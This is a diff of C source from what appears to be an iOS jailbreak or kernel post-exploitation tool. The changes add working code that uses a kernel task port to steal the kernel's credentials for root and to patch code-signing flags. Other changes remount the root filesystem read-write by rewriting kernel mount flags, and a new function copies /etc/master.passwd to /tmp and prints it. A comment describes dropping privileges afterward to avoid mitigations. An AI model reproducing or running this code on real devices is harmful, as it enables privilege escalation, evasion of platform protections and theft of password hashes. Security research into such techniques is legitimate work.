@@ -94,6 +94,9 @@ uint32_t set_csflags(uint32_t pid, uint32_t csflags){
     wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), csflags);
     return -1;
 }
+
+//steals the ucreds from the kernel process and applies them to our target
+//pid. After which it should be possible to setuid(0) and get root.
 void powerup(uint32_t pid){
     //get the process address for the current process
     printf("Get current process bsd_info\n");
@@ -152,7 +155,12 @@ void powerup(uint32_t pid){
     printf("Successfully stole kern_ucred!\n");
 }
 
-uid_t get_root(){
+//wrapper function that elevates the current process to root.
+//returns the old uid so that we can drop privileges before exiting and prevent
+//mitigations triggering.
+uid_t get_root(mach_port_t tfpzero){
+    setupKernelDump(tfpzero);
+    
     uid_t olduid = getuid();
     printf("Current PID: %d, UID: %d\n",getpid(),olduid);
     
@@ -167,6 +175,7 @@ uid_t get_root(){
     return olduid;
 }
 
+//restore our uid to the previous uid
 void reset_root(uid_t olduid){
     setuid(olduid);
     printf("Reset our UID\n");
@@ -224,6 +233,7 @@ uint32_t cpFile(char* source, char* destination){
     
     return counter;
 }
+
 void printFile(char* src) {
     FILE* fd = fopen(src, "r");
     if (fd < 0) {
@@ -272,10 +282,6 @@ void setPlatform(){
     uint32_t cflags = (get_csflags(getpid()) | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD );
     set_csflags(getpid(),cflags);
     printf("New csflags: 0x%07x\n",get_csflags(getpid()));
-    //dumpBsd_Info();
-    cpFile("/etc/master.passwd", "/tmp/master.bak");
-    dirList("/bin");
-    printFile("/tmp/master.bak");
 }
 
 
@@ -283,6 +289,51 @@ uint32_t startBin(){
     return -1;
 }
 
-void remountRW(){
-    
+int remountRW(){
+    // Remount / as rw - patch by xerub
+    // and modified by stek29
+    {
+        vm_offset_t off = 0xd8;
+        uint64_t _rootvnode = find_rootvnode();
+        uint64_t rootfs_vnode = rk64(_rootvnode);
+        uint64_t v_mount = rk64(rootfs_vnode + off);
+        uint32_t v_flag = rk32(v_mount + 0x71);
+        
+        wk32(v_mount + 0x71, v_flag & ~(1 << 6));
+        
+        char *nmz = strdup("/dev/disk0s1s1");
+        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
+        printf("remounting: %d\n", rv);
+        
+        v_mount = rk64(rootfs_vnode + off);
+        wk32(v_mount + 0x71, v_flag);
+        
+        //try write to root and see if we have successfully remounted RW
+        int fd = open("/.staaldraad", O_RDONLY);
+        if (fd == -1) {
+            fd = creat("/.staaldraad", 0444);
+        } else {
+            printf("File already exists!\n");
+        }
+        close(fd);
+        //try open again and if success, file was created on /
+        fd = open("/.staaldraad", O_RDONLY);
+        if (fd == -1) {
+            printf("File doesn't exist... we must have failed!!\n");
+            return -1;
+        } else {
+            //it exists! print message and cleanup
+            printf("File exists! We have RW on /\n");
+            remove("/.staaldraad");
+        }
+        close(fd);
+        rv = mount("hfs", "/Developer", MNT_UPDATE, (void *)&nmz);
+    }
+    return 0;
+}
+
+void copyFiles(){
+    cpFile("/etc/master.passwd", "/tmp/master.bak");
+    dirList("/bin");
+    printFile("/tmp/master.bak");
 }
